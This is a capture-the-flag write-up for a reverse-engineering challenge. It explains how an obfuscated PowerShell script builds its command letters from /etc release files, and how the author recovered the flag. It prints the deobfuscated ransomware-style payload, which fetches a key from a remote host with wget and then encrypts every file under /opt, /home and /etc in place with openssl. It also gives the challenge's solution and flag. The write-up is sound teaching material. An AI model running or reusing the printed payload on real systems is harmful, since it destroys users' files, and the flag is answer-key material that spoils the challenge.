# rev/bash.ps1

by Brandon

127 solves / 422 points

> ⚠️ WARNING: do not run this! this will actually mess up your system!
> 
> [bash.ps1](bash.ps1)
> 
> [enc](enc)

## Files
- [bash.ps1](bash.ps1): the obfuscated PowerShell script
- [enc](enc): the encrypted flag file

**Solvers**
- [alphabet.py](alphabet.py): a Python script to solve the alphabet used in obfuscation
- [bash-deob1.ps1](bash-deob1.ps1): first round of deobfuscation by variable renaming
- [bash-deob2.ps1](bash-deob2.ps1): fully deobfuscated script
- [key](key): the key file downloaded from `35.87.165.65:31337/key`

## Writeup

`bash.ps1` is an obfuscated PowerShell script that, when run, acts as a ransomware by encrypting many critical files on the system.

The letters of the main commands of interest are defined in a global string (called `$GLOBAL:ALPHABET` below) constructed from system-specific information of the victim's machine:

```powershell
function fun2 {
    $file_contents = (/bin/cat /etc/*release*).split('\n')
    $alphabet = (
        $file_contents[0] `
            += $file_contents[1].split('=')[0] `
            += $file_contents[2] `
            += $file_contents[3].split('=')[0] `
            += $file_contents[4].split('=')[0] `
            += $file_contents[5] `
            += $file_contents[6].split('=')[0] `
            += $file_contents[7].split('=')[0] `
            += $file_contents[8] `
            += $file_contents[9] `
            += $file_contents[10] `
            += $file_contents[11] `
            += $file_contents[12] `
            += $file_contents[13] `
            += $file_contents[14] `
            += $file_contents[15] `
            += $file_contents[16]
    ).Tochararray() + 0..9

    $alphabet = ( -join ($alphabet | sort-object | get-unique))
    $GLOBAL:ALPHABET = $alphabet
}
```

Note that the letters in `$GLOBAL:ALPHABET` are sorted based on the Powershell ordering and deduplicated.

Commands are then elaborately executed as
```powershell
Invoke-Expression (
            "" + $GLOBAL:ALPHABET[48] ` # o
               + $GLOBAL:ALPHABET[49] ` # p
               + $GLOBAL:ALPHABET[41] ` # e
               + $GLOBAL:ALPHABET[47] ` # n
               + # ...
)
```

---
The revelation that the script was encrypting everything actually came from DeepSeek, which recognized the similar call structure to `openssl` commands. 
Slowly, by comparing common `openssl` invocations and the sorted nature of `$GLOBAL:ALPHABET`, I arrived at a subset of `$GLOBAL:ALPHABET` I was confident with. The remaining letters were then deciphered using `z3`.

The final alphabet is approximately
```
012345678 !-./:@ABCDEFGHIJKLMNOPQRSTUabcdefgilmnopqstuvwy
```

yielding the deobfuscated script:
```powershell
function fun3 {
    $KEY_URL = "35.87.165.65:31337/key"
    $KEY_FILE = "A" # filename
    /bin/wget $KEY_URL -q -O $KEY_FILE
}

function fun4 {
    foreach ($I in (find /opt/ -type f)) {
        openssl enc -aes-256-cbc -pass file:key -in  $I  -out  $I
    } 

    foreach ($I in (find /home/ -type f)) {
        openssl enc -aes-256-cbc -pass file:key -in  $I  -out  $I
    } 

    foreach ($I in (find /etc/ -type f)) {
        openssl enc -aes-256-cbc -pass file:key -in  $I  -out  $I
    } 

    foreach ($I in (find /vaq/ -type f)) {
        openssl enc -aes-256-cbc -pass file:key -in  $I  -out  $I 
    }
}
```

Visiting `35.87.165.65:31337/key` in the browser resulted in this text:
```
I understand that, without my agreement, Alpine F1 have put out a press release late this afternoon that I am driving for them next year. This is wrong and I have not signed a contract with Alpine for 2023. I will not be driving for Alpine next year.
```

Using that text as a key file, `enc` can finally be decrypted. However, I had problems with Windows corrupting the `enc` and `key` files in some way and had to use WSL to download and decrypt the files.

```bash
$ curl -O 35.87.165.65:31337/key
$ curl -o enc https://damctf-2025-assets.s3.us-west-2.amazonaws.com/assets/rev/bash-ps1/enc
$ openssl enc -d -aes-256-cbc -in enc -out dec -pass file:key
```

The resulting `dec` file:
```bash
$ cat dec
dam{unattended_arch_boxes_will_be_given_powershell}
```
